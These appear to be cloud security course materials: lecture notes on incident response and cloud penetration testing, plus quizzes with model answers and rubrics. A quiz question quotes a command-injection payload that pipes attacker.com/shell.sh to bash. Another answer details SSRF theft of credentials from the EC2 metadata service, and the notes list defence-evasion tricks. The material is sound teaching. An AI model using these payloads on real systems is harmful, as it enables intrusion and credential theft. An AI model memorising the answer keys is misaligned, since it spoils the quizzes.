lecture_notes.demonstration: Running through a complete cloud incident response scenario: GuardDuty detects compromised IAM credentials being used from an unusual location, the automated containment Lambda disables the access key within 2 minutes, the IR team investigates CloudTrail to determine the scope of unauthorized access, preserves evidence in the forensic account, eradicates persistence mechanisms (backdoor user, additional access key), and generates a post-incident report with specific remediation actions
setup_requirements: AWS account with GuardDuty enabled and CloudTrail configured
Pre-staged incident scenario with simulated attacker activity in CloudTrail
EventBridge and Lambda for automated containment
Forensic account for evidence analysis

review.value: An attacker with admin IAM credentials can exfiltrate all S3 data, create backdoors, and disable logging in minutes. Manual incident response is too slow. Automated containment (key disable, policy deny) must trigger within minutes of detection.

Rotating the compromised credential does not eradicate the attacker if they created additional credentials during access. Eradication must include finding and removing all persistence mechanisms: additional users, access keys, roles, Lambda functions, and cross-account trusts.

In cloud, rebuilding from IaC is faster and more reliable than patching a compromised system. Destroy compromised resources and redeploy from known-good templates. This eliminates any hidden persistence that manual cleanup might miss.

Cryptomining attacks cause billing spikes before any security alert triggers. Billing anomaly detection (unexpected EC2 instances, unusual service usage) is a legitimate security detection mechanism in cloud environments.

IR playbooks that are not tested will fail during a real incident. Conduct quarterly cloud IR drills that exercise the full response process: detection, evidence collection, containment, eradication, and recovery. Identify playbook gaps before they matter.

class_schedule.topic: Cloud Penetration Testing Lab and Advanced Techniques
learning_objectives: Execute advanced cloud attack chains combining multiple techniques
Test Kubernetes-specific attack vectors in managed cluster environments
Evaluate cloud security controls from an attacker's perspective to identify gaps
Produce professional cloud security assessment reports with prioritized findings
readings: Kubernetes Goat and CloudGoat vulnerable environment documentation
MITRE ATT&CK Cloud Matrix techniques and sub-techniques
Professional penetration testing report examples and standards

lecture_notes.introduction: Advanced cloud penetration testing moves beyond single-technique exploitation to multi-step attack chains that mirror real-world adversary behavior. The MITRE ATT&CK Cloud Matrix documents the tactics, techniques, and procedures that actual threat actors use against cloud environments, from initial access through persistence, privilege escalation, defense evasion, credential access, discovery, lateral movement, collection, and exfiltration. Sophisticated cloud attacks combine cloud-specific techniques with traditional application and network attacks. An SSRF vulnerability in a web application provides access to the instance metadata service, yielding temporary IAM credentials. Those credentials allow enumerating S3 buckets, one of which contains a Lambda deployment package with hardcoded database credentials. The database contains customer data and also has a VPC endpoint that allows pivoting to other services in the private network. Each step in the chain exploits a different security gap, and defending against the chain requires controls at every step. Kubernetes adds additional attack surface to cloud environments. Managed Kubernetes services (EKS, AKS, GKE) inherit cloud IAM complexity and add Kubernetes RBAC, pod security, network policies, and service account token management. An attacker who gains access to a pod with a mounted service account token that has cluster-admin privileges has full control of the Kubernetes cluster and, through IRSA (IAM Roles for Service Accounts) or similar mechanisms, potentially the underlying cloud account. This session provides hands-on practice with advanced cloud attack chains and Kubernetes-specific security testing, developing the offensive perspective that strengthens defensive architectures.
key_concepts: Multi-step attack chains: combining web application vulnerabilities, IMDS exploitation, IAM privilege escalation, and data access into realistic attack scenarios that test defense-in-depth controls at every stage
MITRE ATT&CK Cloud Matrix: mapping cloud attack techniques to a standard framework for consistent threat modeling, red team planning, and detection gap analysis across cloud environments

Kubernetes attack surface: dashboard exposure, etcd access, kubelet API exploitation, pod escape, service account token theft, and RBAC escalation as additional vectors in managed cluster environments

IRSA/Workload Identity attacks: exploiting the connection between Kubernetes service accounts and cloud IAM roles to escalate from pod-level access to cloud-level access with the permissions of the associated IAM role
Lateral movement in cloud: pivoting between services using discovered credentials, cross-account role assumption, shared resource access, and VPC peering or transit gateway connections

Defense evasion in cloud: disabling CloudTrail, modifying GuardDuty detectors, using STS assume-role to generate sessions in different regions, and using cloudtrail:StopLogging to create investigation blind spots
Data exfiltration techniques: S3 bucket replication to attacker-controlled account, EBS snapshot sharing, RDS snapshot export, and Lambda function exfiltration that bypasses traditional DLP

Testing security controls: from the attacker's perspective, evaluating whether security groups actually block unauthorized access, whether IAM policies effectively prevent escalation, and whether monitoring detects attack techniques

Professional reporting: documenting each attack chain with step-by-step evidence, risk ratings based on business impact and exploitability, and specific cloud-native remediation recommendations for each finding
lecture_notes.demonstration: Executing an advanced attack chain against CloudGoat: exploiting a web application SSRF to access IMDS and obtain Lambda execution role credentials, using those credentials to list S3 buckets and find a sensitive data bucket, then demonstrating how proper IMDSv2 enforcement, least-privilege IAM roles, and S3 access logging would have detected or prevented each step of the attack
setup_requirements: CloudGoat vulnerable AWS environment deployed
Kubernetes Goat for Kubernetes-specific testing
Pacu, enumerate-iam, and kubectl for testing
Report template for documenting findings

review.key: Attack Chains Test Defense in Depth
review.value: A single vulnerability rarely leads directly to critical impact. Attack chains combine multiple weaknesses where each step enables the next. Testing attack chains reveals whether defense-in-depth controls compensate for individual failures.

Managed Kubernetes adds an entirely new control plane (Kubernetes API, RBAC, service accounts) on top of the cloud provider's control plane. Security must cover both: cloud IAM for the cluster infrastructure and Kubernetes RBAC for the workloads running inside it.

Understanding how an attacker would exploit your cloud configuration is the most effective way to find security gaps. Regular cloud penetration testing, either by internal red teams or external assessors, provides this perspective.

Sophisticated cloud attackers attempt to disable CloudTrail to hide their activity. Monitor for CloudTrail status changes (StopLogging, DeleteTrail, PutEventSelectors) with the highest priority alerting. These events should never occur during normal operations.

Telling a cloud team to 'patch the server' does not help. Cloud remediation must be specific: update this IAM policy to remove these permissions, enforce IMDSv2 on these instance profiles, add this S3 bucket policy to restrict access. Specific, cloud-native recommendations get implemented.

learning_objectives: Design a comprehensive cloud security architecture for a multi-account enterprise deployment
Integrate all course security controls into a cohesive defense-in-depth architecture
Present and defend architectural decisions to technical and non-technical stakeholders
Evaluate the architecture against real-world cloud attack scenarios
readings: Review all course materials and cloud provider well-architected frameworks
AWS Well-Architected Framework - Security Pillar complete guide
Azure Cloud Adoption Framework - Security methodology

lecture_notes.introduction: The final project synthesizes all course material into a comprehensive cloud security architecture for a realistic enterprise scenario. Students design a multi-account cloud architecture that incorporates the full spectrum of cloud security controls covered throughout the semester: identity and access management with least-privilege policies and federation, data protection with encryption and key management, network security with VPCs and segmentation, serverless and container security, compliance and governance with guardrails and continuous monitoring, DevSecOps with integrated pipeline security, and incident response with automated playbooks. The architecture must address a realistic enterprise with multiple business units, regulatory requirements (the scenario includes PCI DSS-scoped systems and HIPAA-protected data), development and production environments, hybrid connectivity to on-premises data centers, and a microservices application deployed on Kubernetes. Teams design the account structure, networking topology, IAM hierarchy, security tooling deployment, monitoring and alerting configuration, and incident response procedures. The architecture is evaluated not just on its security strength but on its operational feasibility: can the proposed security team realistically manage this architecture? Are the tools integrated coherently or are there overlapping capabilities creating operational confusion? Is the architecture adaptable to changing business requirements without requiring redesign? During the final presentation, teams face questions from evaluators playing roles including CISO (risk and business alignment), cloud architect (technical feasibility), compliance officer (regulatory coverage), and developer (operational impact on engineering velocity). This simulates the real-world stakeholder alignment required to implement cloud security architectures.
key_concepts: Multi-account architecture: organizational unit structure, account vending for new workloads, centralized logging account, security tooling account, shared services account, and workload accounts separated by environment and business unit

Security architecture documentation: threat model, control matrix mapping controls to threats, architecture diagrams at multiple levels of detail, runbooks for common operations, and decision log documenting architectural choices

Integrated security tooling: selecting and integrating CSPM, SIEM, SOAR, container security, pipeline security, and DLP tools into a coherent security operations platform rather than a disconnected collection of point solutions

Compliance architecture: mapping regulatory requirements to specific controls, demonstrating continuous compliance monitoring, and generating audit evidence automatically for SOC 2, PCI DSS, and HIPAA

Operational feasibility: designing security architectures that the proposed team size can realistically operate, maintain, and improve; automation to reduce manual operational burden; clear runbooks for routine operations

Cost optimization: balancing security control coverage with cloud spending; identifying controls with the highest security return on investment; avoiding over-engineering controls for low-risk resources

Architecture resilience: designing for failure at every level (what happens when the SIEM is down, when the identity provider is unavailable, when a security tool has a false positive that blocks production traffic)

Presentation to stakeholders: communicating technical architecture decisions in business terms for leadership, in technical terms for architects, in compliance terms for auditors, and in operational terms for developers

Continuous improvement plan: the architecture is a living document; include a roadmap for future improvements, metrics for measuring effectiveness, and processes for incorporating lessons learned from incidents and assessments
lecture_notes.demonstration: Instructor reviews example architecture submissions, highlighting effective approaches to multi-account design, common mistakes in IAM architecture, and the difference between architectures that look good on paper and architectures that work in practice, followed by team work time for finalizing their architectures before presentation
setup_requirements: Architecture design templates and tools (draw.io, Lucidchart)
Cloud provider reference architectures for comparison
Scenario documentation with business requirements and constraints
Presentation room setup for final project defenses

review.value: A beautiful architecture diagram means nothing if the security team cannot operate it. Consider the team size, skill sets, and tooling when designing. An architecture requiring 24/7 SOC operations for a team of 3 is not feasible regardless of how secure it is on paper.

Deploying 15 security tools that do not talk to each other creates 15 alert consoles and no correlation. Fewer, well-integrated tools that share context and trigger automated workflows provide better security than a collection of best-of-breed point solutions.

Every architecture has trade-offs. Acknowledging them (we chose to accept risk X because the cost of mitigating it exceeds the potential impact) demonstrates maturity. Pretending there are no trade-offs demonstrates lack of understanding.

Meeting compliance requirements (PCI DSS, HIPAA) does not mean you are secure. Compliance defines the floor, not the ceiling. Your architecture should address real threats, not just checklist items. Many breach victims were fully compliant at the time of the breach.

The first version of any security architecture will have gaps. Design for iteration: modular components that can be upgraded independently, standardized interfaces between tools, and a backlog of known improvements. Perfect is the enemy of deployed.

quizzes.topic: Cloud Fundamentals, IAM, and Data Protection

questions.question: A startup deploys a web application on AWS using EC2 instances with IAM instance profiles. A developer creates a Lambda function that needs to read from the same S3 bucket as the EC2 instances and copies the EC2 instance profile's access key into the Lambda's environment variables. Explain three security problems with this approach, and describe the correct architecture for giving the Lambda function S3 access.
questions.answer: Security problems: (1) Static credentials in environment variables: IAM access keys stored in Lambda environment variables are long-lived credentials that do not rotate automatically. If the Lambda code or configuration is exposed (through logging, error messages, or code repository), the credentials are compromised. Instance profile credentials rotate automatically; copied keys do not. (2) Excessive permissions: the EC2 instance profile likely has permissions beyond S3 access (EC2 metadata, CloudWatch, SSM). Copying these credentials to the Lambda gives it all EC2 permissions, violating least privilege. The Lambda only needs S3 read access. (3) Shared credential blast radius: if the copied credentials are compromised, both the EC2 instances AND the Lambda function's access is at risk. Changes to the EC2 role (rotation, revocation) do not affect the copied keys, creating an unmanaged access path. Correct architecture: Create a dedicated IAM execution role for the Lambda function with a policy granting only s3:GetObject on the specific bucket ARN. Assign this role to the Lambda function's execution role configuration. Lambda automatically receives temporary credentials through STS when it executes, which rotate automatically and are scoped to only the permissions in the Lambda's own role. No static credentials are ever created or stored.

rubric.key: Identifies three valid security problems
Describes the correct Lambda execution role architecture
Explains why temporary credentials are superior to static keys

questions.question: Explain the difference between server-side encryption with provider-managed keys (SSE-S3), server-side encryption with customer-managed KMS keys (SSE-KMS), and client-side encryption for S3 data. For each, describe who holds the encryption key, what protection it provides, and one scenario where that specific encryption type is the best choice.
questions.answer: SSE-S3: AWS manages the encryption key entirely. AWS generates, stores, and manages the AES-256 key. Protection: protects against physical disk theft from AWS data centers; AWS operators with physical access cannot read data. Does NOT protect against anyone with S3 API access (they can read data through the API since AWS transparently decrypts). Best scenario: general-purpose encryption for data where the primary concern is physical media protection and regulatory compliance that requires encryption at rest. SSE-KMS: Customer creates and manages the key in AWS KMS but the key material stays in KMS. The customer controls key policy (who can use the key), key rotation, and key deletion. Protection: all SSE-S3 protections plus access control through key policy. To read data, a user needs BOTH S3 permissions AND kms:Decrypt permission for the specific key. Provides separation of duties between S3 administrators and data access. Best scenario: regulated data (PCI, HIPAA) where you need to demonstrate that data access requires both storage permissions and explicit key usage authorization, with auditable key usage in CloudTrail. Client-side encryption: The customer encrypts data before uploading to S3 using their own key that never enters AWS. AWS stores only encrypted ciphertext. Protection: AWS cannot decrypt the data under any circumstances, including government subpoena or internal compromise. Best scenario: highly sensitive data where the threat model includes cloud provider access (government surveillance, insider threat at the provider, or legal discovery of provider-held keys).

rubric.key: Correctly describes key management for all three types
Accurately explains the protection each type provides
Provides appropriate scenarios for each encryption type

questions.question: A company discovers that a developer's AWS access key was accidentally committed to a public GitHub repository 6 hours ago. The key belongs to a user with PowerUserAccess (everything except IAM). Describe the immediate incident response steps in priority order, explain what attacker actions you would investigate in CloudTrail, and describe the persistence mechanisms an attacker might have established that must be eradicated.
questions.answer: Immediate response steps in priority order: (1) Disable the compromised access key immediately through IAM console or CLI (aws iam update-access-key --status Inactive). This takes seconds and prevents further use. (2) Check CloudTrail for any API calls made with this key from non-corporate IP addresses. Start with the last 6 hours. (3) Check for any new resources created: EC2 instances (cryptomining), Lambda functions (persistence), S3 buckets (data staging), and EBS snapshots shared with external accounts. CloudTrail investigation: Look for reconnaissance: sts:GetCallerIdentity, s3:ListBuckets, ec2:DescribeInstances, iam:ListUsers. Look for data access: s3:GetObject on sensitive buckets, rds:CreateDBSnapshot, dynamodb:Scan. Look for persistence: iam:CreateAccessKey (new keys on other users), iam:CreateUser (backdoor accounts), lambda:CreateFunction (scheduled backdoor), ec2:RunInstances (in rarely-used regions). Look for defense evasion: cloudtrail:StopLogging, guardduty:DeleteDetector. Persistence mechanisms to eradicate: (1) Additional access keys created on any IAM user (the attacker has PowerUserAccess but not IAM; however, verify no IAM permission through service-linked roles). (2) EC2 instances with reverse shells or crypto miners (check all regions). (3) Lambda functions running on schedule that maintain a backdoor. (4) S3 bucket policies granting external account access. (5) EBS snapshots or RDS snapshots shared with external accounts. (6) VPC peering connections to attacker-controlled accounts. (7) SSM documents or EC2 user data scripts that execute on instance restart.

rubric.key: Correct priority ordering of immediate response
Identifies relevant CloudTrail investigation targets
Lists specific persistence mechanisms to eradicate

quizzes.topic: Cloud Networking, Serverless, and Container Security

questions.question: A Kubernetes deployment runs three microservices: a public API gateway, an internal order processing service, and a database proxy. All three run in the same namespace with no network policies. Explain the security risk, design Kubernetes network policies that enforce least-privilege communication between these services, and describe what happens when a new service is added to the namespace.
questions.answer: Security risk: Without network policies, any pod in the namespace can communicate with any other pod on any port. If the public API gateway is compromised (through injection, SSRF, or dependency vulnerability), the attacker can directly access the order processing service and the database proxy, potentially reaching the database itself. The attacker can also communicate with pods in other namespaces and access the Kubernetes API. There is no network-level containment. Network policies: (1) Default deny all ingress and egress for the namespace: a policy that selects all pods and specifies no allowed traffic, establishing a baseline of no communication. (2) API Gateway: allow ingress from the internet/ingress controller on port 443. Allow egress to the order processing service on port 8080 only. Deny all other egress. (3) Order Processing: allow ingress from the API gateway on port 8080. Allow egress to the database proxy on port 5432 only. Deny all other communication. (4) Database Proxy: allow ingress from the order processing service on port 5432. Allow egress to the actual database endpoint. Deny all other traffic. When a new service is added: Because the default-deny policy applies to all pods in the namespace, the new service has NO network connectivity by default. It cannot send or receive any traffic until explicit network policies are created allowing its required communication paths. This is secure by default: new services start isolated and must have communication explicitly permitted.

rubric.key: Clearly explains the security risk of no network policies
Designs correct policies with default-deny and explicit allow rules
Correctly explains the impact on new services

questions.question: A serverless application uses an API Gateway that triggers a Lambda function. The Lambda function processes user input and executes a shell command to convert uploaded files. An attacker sends a filename containing '; curl attacker.com/shell.sh | bash;'. Explain the vulnerability, describe three defense layers that should prevent this attack, and explain why least-privilege IAM execution roles limit the impact even if the injection succeeds.
questions.answer: Vulnerability: The Lambda function uses user-provided input (filename) directly in a shell command without sanitization. The semicolons terminate the intended command and inject arbitrary commands. The attacker downloads and executes a reverse shell, gaining code execution inside the Lambda function's runtime environment. Three defense layers: (1) Input validation at API Gateway: configure API Gateway request validation to reject filenames containing special characters (;, |, &, backticks, $()). This stops the attack at the entry point before it reaches the Lambda function. (2) Parameterized command execution: instead of constructing shell commands with string concatenation, use the language's subprocess library with argument arrays (subprocess.run(['convert', filename]) in Python) where the filename is passed as a single argument, not interpreted by the shell. This prevents command injection at the code level. (3) Lambda execution environment hardening: use Lambda layers with minimal dependencies, remove shell access if possible (use distroless runtime), and configure Lambda in a VPC with no internet access so even if injection succeeds, the attacker cannot download external tools or establish outbound connections. Why least-privilege IAM limits impact: If the Lambda execution role has only s3:GetObject on the upload bucket and s3:PutObject on the output bucket, a successful injection gives the attacker only those permissions. They cannot access other S3 buckets, other AWS services, IAM, or account-level resources. Without iam:PassRole, they cannot escalate privileges. The blast radius is limited to the specific resources the function legitimately accesses.

rubric.key: Correctly explains the command injection vulnerability
Describes three effective defense layers
Explains how IAM least privilege limits blast radius

questions.question: Compare the security trade-offs of using AWS security groups versus Kubernetes network policies for microsegmentation. Describe a scenario where each is the better choice, and explain what happens when they are used together in an EKS cluster.
questions.answer: AWS security groups: Operate at the EC2 instance/ENI level. Stateful (return traffic auto-allowed). Reference other security groups by ID for dynamic policies. Managed by AWS control plane, independent of workload state. Cannot differentiate between pods on the same node. Best scenario: Isolating EKS worker node groups by function (production nodes cannot communicate with development nodes). Security groups provide infrastructure-level segmentation that persists even if Kubernetes network policy enforcement fails. Kubernetes network policies: Operate at the pod level using label selectors. Enforce through CNI plugins (Calico, Cilium). Can differentiate between pods on the same node. Support namespace-scoped policies. Depend on the CNI plugin being healthy. Best scenario: Isolating individual microservices within a single EKS cluster. Pod A (web server) can talk to Pod B (API) on port 8080, but not to Pod C (database) on port 5432, even though all three pods run on the same worker node. When used together in EKS: Both enforce simultaneously. Traffic must be allowed by BOTH the security group AND the network policy. Security groups filter at the node level (all traffic entering/leaving the EC2 instance). Network policies filter at the pod level (traffic between pods, even on the same node). A request from Pod A to Pod B on the same node is evaluated by network policy only (it never leaves the node). A request from Pod A to Pod C on a different node must pass both the security group on the source node, the security group on the destination node, and the network policy on the destination pod. This provides defense in depth: even if network policy enforcement fails (CNI bug), security groups still protect at the infrastructure level.

rubric.key: Correctly describes security group and network policy capabilities
Provides appropriate scenarios for each
Accurately explains combined behavior in EKS

questions.question: An organization processing credit card payments runs their payment processing system on AWS. Their PCI DSS auditor asks to see evidence that cardholder data is encrypted at rest and that access to the encryption keys is restricted. Describe exactly what AWS services and configurations you would show the auditor, what evidence you would provide, and explain why the cloud provider's PCI DSS certification alone is insufficient.
questions.answer: Evidence to present: (1) S3 bucket encryption: Show the bucket policy that enforces server-side encryption with customer-managed KMS key (denies PutObject without SSE-KMS header). Show the KMS key policy that restricts key usage to only the payment processing IAM roles. Show the S3 bucket policy that restricts access to only the payment processing application roles. (2) RDS database encryption: Show the RDS instance configuration confirming encryption is enabled with a customer-managed KMS key. Show the KMS key policy restricting decrypt permissions. Show the RDS security group limiting network access to only the application servers. (3) EBS volume encryption: Show the EC2 instances in the cardholder data environment have encrypted root and data volumes. Show the account-level default EBS encryption setting. (4) KMS key usage audit: Provide CloudTrail logs showing KMS key usage, demonstrating that only authorized principals have accessed the encryption keys. Show the key policy that denies direct access to key material. (5) Access control evidence: IAM policies for payment processing roles showing least-privilege access. CloudTrail evidence showing no unauthorized access to cardholder data resources. Why provider certification is insufficient: AWS's PCI DSS certification covers the infrastructure controls: physical security, hypervisor, network fabric. It does NOT cover customer-side controls: how the customer encrypts data, who has IAM access, whether security groups are properly configured, or whether logging is enabled. The customer must independently demonstrate compliance for all controls in their responsibility under the shared responsibility model. The auditor needs evidence of BOTH the provider's certification (for infrastructure) and the customer's controls (for everything above infrastructure).

rubric.key: Identifies specific AWS services and configurations to demonstrate
Describes concrete evidence to provide to the auditor
Correctly explains why provider certification is insufficient

questions.question: During a cloud forensic investigation, you discover that the attacker disabled CloudTrail in the compromised account 30 minutes after initial access. Describe what evidence is still available for your investigation despite CloudTrail being disabled, and explain three preparation measures that would have mitigated this evidence destruction.
questions.answer: Evidence still available: (1) CloudTrail logs from before it was disabled (first 30 minutes of attacker activity, including the StopLogging event itself). (2) VPC Flow Logs (if enabled): network connection metadata showing source/destination IPs, ports, and data volumes; these are separate from CloudTrail and continue logging. (3) S3 access logs (if enabled on affected buckets): record GetObject, PutObject calls independent of CloudTrail. (4) CloudWatch Logs: application logs, Lambda execution logs, and system logs that continue collecting. (5) AWS Config resource history: records resource configuration changes even without CloudTrail. (6) GuardDuty findings: GuardDuty operates independently and would have generated findings for the CloudTrail disable event and any subsequent suspicious activity it detects through alternate data sources. (7) DNS query logs (if enabled): Route 53 resolver query logs showing DNS activity. Three preparation measures: (1) CloudTrail log delivery to a separate account with Organization Trail: configure an organization-level trail that delivers logs to a centralized logging account. Even if CloudTrail is disabled in the compromised account, the organization trail continues logging in the centralized account that the compromised credentials cannot access. (2) SCP preventing CloudTrail modification: apply an Organization SCP that denies cloudtrail:StopLogging, cloudtrail:DeleteTrail, and cloudtrail:PutEventSelectors for all accounts except a dedicated security admin role. The attacker's credentials cannot disable logging. (3) Real-time CloudTrail streaming to SIEM: stream CloudTrail events to a SIEM in real-time. Even if CloudTrail is later disabled, all events up to that point are already in the SIEM and cannot be deleted by the attacker.

rubric.key: Identifies available evidence sources beyond CloudTrail
Describes three effective preparation measures
Explains how preparation measures prevent evidence destruction

questions.question: Your organization uses AWS for production workloads and Azure for Microsoft 365 and Azure AD. A security incident involves an attacker who compromised an Azure AD account and used it to access AWS resources through SAML federation. Describe the investigation challenges of this cross-cloud incident and the specific logs you would analyze in each platform.
questions.answer: Investigation challenges: (1) Log correlation across platforms: Azure AD sign-in logs and AWS CloudTrail logs use different schemas, timestamps may have clock skew, and user identifiers differ (Azure UPN vs AWS ARN). Correlating the same user's actions across both platforms requires mapping identity federation mappings. (2) Jurisdiction boundaries: the Azure AD compromise may have started in the Azure tenant, but the impact is in the AWS account. Two different teams may own these platforms, with different tools and access. Coordinating the investigation requires cross-team collaboration. (3) Token-based access: SAML tokens generated by Azure AD are used to assume AWS roles. The token grant event is in Azure logs; the role assumption event is in AWS logs. Understanding the full attack chain requires both. (4) Different forensic tools and procedures: each platform has its own forensic capabilities, and investigators need expertise in both. Azure logs in Azure AD: (1) Sign-in logs: source IP, device, location, MFA status, and conditional access evaluation for the compromised account. Look for sign-ins from unusual locations or devices. (2) Audit logs: any changes to the user's groups, roles, or authentication methods that the attacker made. (3) Azure AD application activity: SAML token issuance to the AWS federated application, showing when the attacker obtained AWS access. (4) Conditional Access policy evaluation: whether the access should have been blocked by existing policies. AWS logs: (1) CloudTrail: sts:AssumeRoleWithSAML events showing the federated user assuming AWS roles. The sourceIPAddress and userAgent fields help identify the attacker. (2) Subsequent API calls made with the assumed role: what resources were accessed, what changes were made. (3) VPC Flow Logs: if the attacker accessed EC2 instances or other network resources from the assumed role. (4) S3 access logs: data access patterns from the compromised identity.

rubric.key: Identifies specific cross-cloud investigation challenges
Specifies correct Azure AD logs and what to look for
Specifies correct AWS logs and what to look for

quizzes.topic: CSPM, DevSecOps, and Cloud Penetration Testing

questions.question: A CSPM tool reports 3,200 findings across your organization's 50 AWS accounts. The security team of 4 people is overwhelmed. Describe a strategy for prioritizing and managing these findings, including how you would categorize them, which you would auto-remediate, which require human review, and how you would prevent finding recurrence.
questions.answer: Prioritization strategy: Category 1 - Critical/Auto-remediate (estimated 5-10% of findings): Internet-exposed resources (public S3 buckets, security groups with 0.0.0.0/0 on management ports, public RDS instances). These are actively exploitable and should be auto-remediated within minutes via EventBridge + Lambda. Category 2 - High/Investigate within 24 hours (estimated 15-20%): Unencrypted data stores containing sensitive data, IAM users without MFA, overly permissive IAM policies with wildcard permissions. These require human review to assess business impact before remediation. Category 3 - Medium/Ticket with SLA (estimated 30-40%): Missing encryption on non-sensitive resources, logging gaps, minor configuration deviations from CIS benchmarks. Create tickets with 30-day SLA for the owning team. Category 4 - Low/Accept or suppress (estimated 30-50%): Informational findings, configuration choices that are intentional and documented (tagged as accepted risk), findings in development environments with lower security requirements. Document accepted risks and suppress from future reports. Prevention of recurrence: (1) Implement SCPs that prevent the most common critical misconfigurations (no public S3, no unencrypted EBS). (2) Add CSPM policy checks to CI/CD pipelines so misconfigurations are caught before deployment. (3) Publish monthly CSPM metrics by team to create accountability. (4) Provide self-service remediation guides so teams can fix their own findings. (5) Conduct root cause analysis for recurring finding types and address the underlying process or knowledge gap.

rubric.key: Clear categorization framework with realistic proportions
Correct identification of auto-remediation vs human review candidates
Practical prevention measures for finding recurrence

questions.question: Your CI/CD pipeline includes SAST scanning that blocks deployments when critical vulnerabilities are found. A developer complains that the scanner flagged a SQL injection vulnerability in code that uses parameterized queries correctly. Explain why this is likely a false positive, describe how you would verify, and propose a process for handling false positives that does not compromise security or developer productivity.
questions.answer: Why likely false positive: SAST tools analyze code patterns statically without executing the code. The scanner likely detected a SQL query string being constructed or passed as a parameter and flagged it based on pattern matching, without recognizing that parameterized queries (using ? placeholders or named parameters with separate value binding) prevent SQL injection by design. The tool sees SQL string + user input flowing to a database call and flags it, but cannot determine that the parameterization separates the query structure from the data values. Verification steps: (1) Review the flagged code: confirm that the SQL uses parameterized queries (e.g., cursor.execute('SELECT * FROM users WHERE id = ?', (user_id,)) rather than string formatting (f'SELECT * FROM users WHERE id = {user_id}'). (2) Check the scanner documentation for known false positive patterns with the specific database library being used. (3) Run a DAST scan against the running application targeting the same endpoint to confirm the injection is not actually exploitable. False positive process: (1) Developer flags the finding as potential false positive in the scanner's UI. (2) Security champion on the team reviews and confirms using the verification steps above. (3) If confirmed false positive, add an inline suppression comment (e.g., # nosec - parameterized query confirmed) with the reviewer's name and date. (4) The suppression is tracked in a register and reviewed quarterly to ensure suppressions remain valid. (5) Report false positive to scanner vendor to improve detection accuracy. (6) If the finding type has a high false positive rate, adjust scanner rules to reduce noise while maintaining detection for actual injection patterns. Critical balance: never allow developers to suppress findings unilaterally. Always require a second pair of eyes (security champion or security team) to confirm. Track suppression metrics: a high suppression rate for a specific rule indicates the rule needs tuning.

rubric.key: Correctly explains why the finding is likely a false positive
Describes proper verification steps
Proposes a balanced false positive handling process

questions.question: During a cloud penetration test, you discover an EC2 instance with IMDSv1 enabled running a web application. You find an SSRF vulnerability that allows you to make requests to arbitrary internal URLs. Describe the exact steps to exploit this to obtain AWS credentials, what you can do with the obtained credentials, and recommend the specific AWS configuration changes that would prevent this attack.
questions.answer: Exploitation steps: (1) Use the SSRF vulnerability to send a GET request to http://169.254.169.254/latest/meta-data/ to confirm IMDS access. (2) Request http://169.254.169.254/latest/meta-data/iam/security-credentials/ to list the IAM role name attached to the instance. (3) Request http://169.254.169.254/latest/meta-data/iam/security-credentials/{role-name} to retrieve temporary AWS credentials (AccessKeyId, SecretAccessKey, and SessionToken). (4) These are temporary STS credentials valid for 1-6 hours that can be used from anywhere, not just from the EC2 instance. What you can do: Use the credentials with AWS CLI (aws configure) to make API calls with the permissions of the EC2 instance's IAM role. Depending on the role's permissions: list and read S3 buckets, describe EC2 instances and security groups (reconnaissance), access databases, invoke Lambda functions, or potentially escalate privileges if the role has IAM-related permissions. The credentials work from any IP address, not just the instance. Prevention configuration changes: (1) Enforce IMDSv2: set HttpTokens to 'required' on all EC2 instances. IMDSv2 requires a PUT request to obtain a session token before accessing metadata. SSRF vulnerabilities that only allow GET requests (most of them) cannot complete the PUT-then-GET sequence. Configure this as an account-level default. (2) Limit IMDS hop count: set HttpPutResponseHopLimit to 1 so that containers running on the instance cannot reach IMDS through network hops (prevents container escape to IMDS). (3) Restrict IAM role permissions: apply least-privilege to the instance role so that even if credentials are obtained, the attacker can only perform limited actions. (4) Fix the SSRF vulnerability: validate and restrict URLs that the application can request; block requests to 169.254.169.254 and other internal addresses.

rubric.key: Correctly describes the step-by-step IMDS exploitation via SSRF
Accurately explains what the obtained credentials enable
Recommends correct preventive configuration changes

quizzes.topic: Cloud Incident Response, Advanced Attacks, and Architecture

questions.question: An attacker who compromised an AWS account creates a cross-account role with a trust policy allowing their external AWS account to assume it, then deletes the initial compromised credentials. Explain why this is an effective persistence mechanism, how you would detect it in CloudTrail, and what your eradication steps would be.
questions.answer: Why it is effective: The cross-account role allows the attacker to access the victim's account from their own AWS account using sts:AssumeRole. Even after the original compromised credentials are rotated or deleted, the attacker retains access through the backdoor role. The role does not require a password or access key; it uses IAM role assumption with the trust policy as the authentication mechanism. Security teams often focus on rotating credentials and removing unauthorized users but may not audit all IAM role trust policies for external account references. CloudTrail detection: (1) The iam:CreateRole event with a trust policy containing an external AWS account ID (any account not in your organization). Search CloudTrail for CreateRole events and examine the AssumeRolePolicyDocument for Principal entries containing account IDs not in your AWS Organization. (2) sts:AssumeRole events where the source account (the requester) is external. CloudTrail logs the sourceIdentity and the requesting account when a role is assumed cross-account. (3) Ongoing monitoring: any iam:UpdateAssumeRolePolicy event that adds an external account to a trust policy. Eradication steps: (1) Immediately delete the backdoor role (iam:DeleteRole after detaching all policies). (2) Search for all other roles with external trust policies by querying IAM for every role's trust policy and flagging any that trust accounts outside your organization. (3) Review CloudTrail for any actions taken via the backdoor role to assess what the attacker accessed. (4) Implement an SCP that prevents creating roles with trust policies referencing accounts outside the organization (aws:PrincipalOrgID condition). (5) Configure a Config Rule or GuardDuty custom threat list to continuously monitor for external trust policies.

rubric.key: Correctly explains why cross-account role persistence is effective
Identifies correct CloudTrail events for detection
Provides thorough eradication and prevention steps

questions.question: Design a cloud security architecture for an organization that must comply with both PCI DSS (payment data) and HIPAA (health data). These two data types must never be mixed. Describe the AWS account structure, network architecture, IAM strategy, and monitoring approach that ensures compliance with both regulations simultaneously.
